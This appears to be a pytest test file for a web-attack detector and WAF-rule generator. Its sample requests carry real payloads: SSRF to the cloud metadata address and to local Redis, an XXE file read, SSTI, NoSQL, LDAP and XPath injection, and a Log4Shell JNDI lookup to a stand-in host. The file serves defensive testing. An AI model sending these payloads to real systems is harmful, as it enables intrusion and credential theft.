"""The newer attack families (improvement 3): patterns, attack type, fixes and WAF rules."""
from urllib.parse import unquote_plus

import pandas as pd
import pytest

from eval.benign_tricky_new import rows as benign_rows
from ml.attack_type import attack_types
from ml.defense import FixFinder, evidence_text, waf_rules
from ml.features import new_family_counts, value_features
from ml.knowledge_base import KNOWLEDGE_BASE
from ml.new_families import to_requests

EXAMPLES = [   # (family, method, path, body)
    ("ssrf", "GET", "/fetch?url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2F", ""),
    ("ssrf", "GET", "/fetch?url=gopher%3A%2F%2Flocalhost%3A6379%2F_INFO", ""),
    ("xxe", "POST", "/api/import",
     '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/hostname">]><r>&x;</r>'),
    ("ssti", "GET", "/hello?name=%7B%7B7*7%7D%7D", ""),
    ("nosql", "GET", "/login?user%5B%24ne%5D=x&pass%5B%24ne%5D=x", ""),
    ("nosql", "POST", "/login", '{"user": {"$gt": ""}, "pass": {"$gt": ""}}'),
    ("log4shell", "GET", "/search?q=%24%7Bjndi%3Aldap%3A%2F%2Fexample.lab%2Fa%7D", ""),
    ("ldap", "GET", "/people?name=*)(uid%3D*))(%7C(uid%3D*", ""),
    ("xpath", "GET", "/item?id=count(%2Fchild%3A%3Anode())", ""),
]
_FEATURE = {"log4shell": "log4j"}


@pytest.mark.parametrize("family,method,path,body", EXAMPLES)
def test_each_family_is_seen_and_typed(family, method, path, body):
    assert new_family_counts(path, body)[_FEATURE.get(family, family)] > 0
    assert value_features(method, path, body)["v_kw_total"] > 0
    assert attack_types([method], [path], [body]) == [family]       # rules only, no model


def test_benign_text_with_braces_links_and_dollars_is_not_a_new_family():
    r = benign_rows()
    hits = [p for p, b in zip(r["path"], r["body"]) if any(new_family_counts(p, b).values())]
    assert hits == []


def test_ordinary_braces_are_not_template_code():
    plain = value_features("GET", "/s?q=Dear%20%7Bcustomer%7D%2C%20thanks", "")
    code = value_features("GET", "/s?q=%7B%7B7*7%7D%7D", "")
    assert plain["v_ctx_brace"] == 0 and code["v_ctx_brace"] > 0


def test_public_and_internal_links():
    assert new_family_counts("/r?next=https%3A%2F%2Fwww.example.com%2Fhelp", "")["ssrf"] == 0
    assert new_family_counts("/r?next=http%3A%2F%2F127.0.0.1%3A8080%2Fadmin&x=1", "")["ssrf"] > 0


def test_every_new_family_has_a_fix():
    families = {e["family"] for e in KNOWLEDGE_BASE}
    assert {"ssrf", "xxe", "ssti", "nosql", "log4shell", "ldap", "xpath"} <= families


def test_knn_picks_cloud_metadata_for_a_metadata_ssrf():
    rows = pd.DataFrame({"method": ["GET"], "path": [EXAMPLES[0][2]], "body": [""], "status": [200],
                         "timestamp": ["2026-10-30T10:00:00Z"]})
    best = FixFinder().nearest(evidence_text("ssrf", rows), k=1, family="ssrf")[0][0]
    assert best["id"] == "ssrf-cloud"


def test_waf_rule_for_xxe_reads_the_body_and_nosql_reads_names():
    rows = pd.DataFrame({"method": ["POST"], "path": ["/api/import"], "body": [EXAMPLES[2][3]], "status": [200]})
    xxe = "\n".join(waf_rules("10.0.0.9", "block", {"xxe": rows}))
    nosql = "\n".join(waf_rules("10.0.0.9", "block", {"nosql": rows}))
    assert "SecRule REQUEST_BODY" in xxe and "<!(?:doctype|entity)" in xxe
    assert "ARGS_NAMES" in nosql


def test_payloads_are_put_inside_normal_requests():
    normals = pd.DataFrame({"Method": ["GET", "POST"],
                            "path": ["/shop/item.jsp?id=3&name=Tea", "/shop/pay.jsp"],
                            "body": ["", "card=1234&amount=10"]})
    reqs = to_requests(["{{7*7}}", "<!DOCTYPE a [<!ENTITY b SYSTEM 'file:///x'>]><a>&b;</a>"],
                       ["ssti", "xxe"], normals, copies=4, seed=1)
    assert len(reqs) == 8
    for method, path, body, family in reqs:
        text = unquote_plus(path) + unquote_plus(body)
        assert ("{{7*7}}" if family == "ssti" else "<!DOCTYPE") in text
    assert any(m == "POST" and b.startswith("<!DOCTYPE") for m, _, b, f in reqs if f == "xxe")
